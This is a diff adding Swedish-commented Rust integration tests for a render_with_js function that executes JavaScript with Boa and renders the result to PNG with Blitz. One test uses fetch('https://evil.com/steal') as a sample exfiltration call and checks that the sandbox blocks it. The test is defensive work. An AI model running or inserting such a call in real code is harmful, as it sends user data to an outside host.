@@ -2,6 +2,8 @@
 /// Inspirerade av WebArena-benchmark-scenarion
 // Notera: Dessa tester körs med: cargo test --test integration_test
 use aether_agent::*;
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+use base64::Engine as _;
 
 /// Rekursiv sökning i noder (inklusive children)
 fn find_node_recursive<'a>(
@@ -3332,5 +3334,188 @@ fn test_select_parse_tier_returns_json() {
     assert!(
         result["reason"].is_string(),
         "Borde ha 'reason' i resultatet"
+    );
+}
+
+// ─── render_with_js: Boa JS → Blitz rendering end-to-end ──────────────────
+
+/// Bevisar att Boa JS modifierar DOM-text och Blitz renderar den modifierade versionen
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+#[test]
+fn test_render_with_js_modifies_dom_and_renders() {
+    let html = r##"<html><body><h1 id="title">Original</h1></body></html>"##;
+    let js = r#"document.getElementById("title").textContent = "Modified by Boa";"#;
+
+    let json_str = aether_agent::render_with_js(html, js, "https://test.se", 800, 600);
+    let result: serde_json::Value =
+        serde_json::from_str(&json_str).expect("Borde vara giltig JSON");
+
+    // JS-evalueringen borde lyckas
+    assert!(
+        result["js_error"].is_null(),
+        "Borde inte ha JS-fel, fick: {:?}",
+        result["js_error"]
+    );
+
+    // Mutationer borde ha skett
+    assert!(
+        result["mutation_count"].as_u64().unwrap_or(0) > 0,
+        "Borde ha minst en DOM-mutation"
+    );
+
+    // PNG borde produceras
+    assert!(
+        !result["png_base64"].as_str().unwrap_or("").is_empty(),
+        "Borde ha en non-empty PNG base64-sträng"
+    );
+
+    // Verifiera att det faktiskt är en giltig PNG
+    let png_b64 = result["png_base64"].as_str().unwrap();
+    let png_bytes = base64::engine::general_purpose::STANDARD
+        .decode(png_b64)
+        .expect("Borde kunna dekoda base64");
+    assert!(
+        png_bytes.len() >= 8
+            && png_bytes[0] == 0x89
+            && png_bytes[1] == b'P'
+            && png_bytes[2] == b'N'
+            && png_bytes[3] == b'G',
+        "Borde vara giltig PNG (magic bytes)"
+    );
+
+    // Storlek borde vara rimlig
+    assert!(
+        result["png_size_bytes"].as_u64().unwrap_or(0) > 100,
+        "PNG borde vara >100 bytes"
+    );
+
+    // Modifierad HTML borde innehålla den nya texten
+    assert!(
+        result["modified_html_length"].as_u64().unwrap_or(0) > 0,
+        "Modifierad HTML borde ha innehåll"
+    );
+}
+
+/// Testar att JS kan skapa nya element och att Blitz renderar dem
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+#[test]
+fn test_render_with_js_creates_elements() {
+    let html = r##"<html><body><div id="container"></div></body></html>"##;
+    let js = r#"
+        var div = document.createElement("p");
+        div.textContent = "Dynamiskt skapat element";
+        document.getElementById("container").appendChild(div);
+    "#;
+
+    let json_str = aether_agent::render_with_js(html, js, "https://test.se", 800, 600);
+    let result: serde_json::Value =
+        serde_json::from_str(&json_str).expect("Borde vara giltig JSON");
+
+    assert!(
+        result["js_error"].is_null(),
+        "Borde inte ha JS-fel vid createElement: {:?}",
+        result["js_error"]
+    );
+    assert!(
+        result["mutation_count"].as_u64().unwrap_or(0) > 0,
+        "Borde ha DOM-mutationer från createElement+appendChild"
+    );
+    assert!(
+        !result["png_base64"].as_str().unwrap_or("").is_empty(),
+        "Borde rendera till PNG trots dynamiskt skapade element"
+    );
+}
+
+/// Testar att JS kan ändra stil och Blitz renderar med ny stil
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+#[test]
+fn test_render_with_js_modifies_style() {
+    let html = r##"<html><body><div id="box" style="width:100px;height:100px;background:red"></div></body></html>"##;
+    let js = r#"document.getElementById("box").setAttribute("style", "width:200px;height:200px;background:blue");"#;
+
+    let json_str = aether_agent::render_with_js(html, js, "https://test.se", 800, 600);
+    let result: serde_json::Value =
+        serde_json::from_str(&json_str).expect("Borde vara giltig JSON");
+
+    assert!(
+        result["js_error"].is_null(),
+        "Borde inte ha JS-fel vid setAttribute"
+    );
+    assert!(
+        result["mutation_count"].as_u64().unwrap_or(0) > 0,
+        "Borde ha mutation från setAttribute"
+    );
+    assert!(
+        !result["png_base64"].as_str().unwrap_or("").is_empty(),
+        "Borde rendera till PNG med ändrad stil"
+    );
+}
+
+/// Testar att farliga JS-operationer blockeras även i render_with_js
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+#[test]
+fn test_render_with_js_blocks_forbidden_js() {
+    let html = "<html><body><p>Safe</p></body></html>";
+    let js = "fetch('https://evil.com/steal')";
+
+    let json_str = aether_agent::render_with_js(html, js, "https://test.se", 800, 600);
+    let result: serde_json::Value =
+        serde_json::from_str(&json_str).expect("Borde vara giltig JSON");
+
+    assert!(
+        result["js_error"].is_string(),
+        "Borde blockera fetch() — fick: {:?}",
+        result["js_error"]
+    );
+}
+
+/// Testar att tom JS-kod ger omodifierad rendering
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+#[test]
+fn test_render_with_js_empty_code() {
+    let html = r##"<html><body><p>Unchanged</p></body></html>"##;
+    let js = "";
+
+    let json_str = aether_agent::render_with_js(html, js, "https://test.se", 800, 600);
+    let result: serde_json::Value =
+        serde_json::from_str(&json_str).expect("Borde vara giltig JSON");
+
+    assert!(
+        result["mutation_count"].as_u64().unwrap_or(99) == 0,
+        "Tom JS borde ge 0 mutationer"
+    );
+    assert!(
+        !result["png_base64"].as_str().unwrap_or("").is_empty(),
+        "Borde fortfarande rendera till PNG"
+    );
+}
+
+/// Testar setTimeout-integration: JS med timer modifierar DOM
+#[cfg(all(feature = "js-eval", feature = "blitz"))]
+#[test]
+fn test_render_with_js_with_settimeout() {
+    let html = r##"<html><body><span id="counter">0</span></body></html>"##;
+    let js = r#"
+        setTimeout(function() {
+            document.getElementById("counter").textContent = "42";
+        }, 10);
+    "#;
+
+    let json_str = aether_agent::render_with_js(html, js, "https://test.se", 800, 600);
+    let result: serde_json::Value =
+        serde_json::from_str(&json_str).expect("Borde vara giltig JSON");
+
+    // Event-loopen borde ha kört timern
+    assert!(
+        result["timers_fired"].as_u64().unwrap_or(0) > 0,
+        "setTimeout borde ha avfyrats"
+    );
+    assert!(
+        result["event_loop_ticks"].as_u64().unwrap_or(0) > 0,
+        "Event-loopen borde ha tickat"
+    );
+    assert!(
+        !result["png_base64"].as_str().unwrap_or("").is_empty(),
+        "Borde rendera till PNG med setTimeout-modifierad DOM"
     );
 }
